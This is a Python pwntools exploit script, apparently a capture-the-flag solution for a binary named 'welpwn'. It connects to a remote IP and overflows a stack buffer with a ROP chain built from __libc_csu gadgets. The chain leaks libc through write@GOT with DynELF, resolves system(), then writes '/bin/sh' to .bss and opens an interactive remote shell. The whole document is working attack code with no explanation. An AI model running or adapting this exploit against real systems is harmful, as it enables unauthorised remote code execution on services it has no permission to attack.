from pwn import *
context.log_level='debug'
p=remote("220.249.52.133",39936)
elf=ELF("./welpwn")
start_addr=0x400630
write_addr=elf.got['write']
read_addr=elf.got['read']
ppp1_addr=0x40089A
ppp2_addr=0x400880
clean_addr=0x40089C
def leak(addr):
	p.recv()
	payload='a'*24+p64(clean_addr)+p64(ppp1_addr)+p64(0)+p64(1)+p64(write_addr)+p64(8)+p64(addr)+p64(1)
	payload+=p64(ppp2_addr)+'a'*56+p64(start_addr)
	p.send(payload.ljust(1024,'a'))
	buff=p.recv(8)
	print(buff.encode('hex'))
	return buff 
dyn=DynELF(leak,elf=ELF("./welpwn"))
sys_addr=dyn.lookup("system","libc")
print("System addr:%X" % sys_addr)
def getshell():
	pop_rdi=0x4008A3
	payload='a'*24+p64(clean_addr)+p64(ppp1_addr)+p64(0)+p64(1)+p64(read_addr)+p64(8)+p64(elf.bss())+p64(0)
	payload+=p64(ppp2_addr)+'a'*56+p64(pop_rdi)+p64(elf.bss())+p64(sys_addr)+p64(0)
	p.recv()
	p.send(payload.ljust(1024,'a'))
	p.sendline("/bin/sh")
getshell()
p.interactive()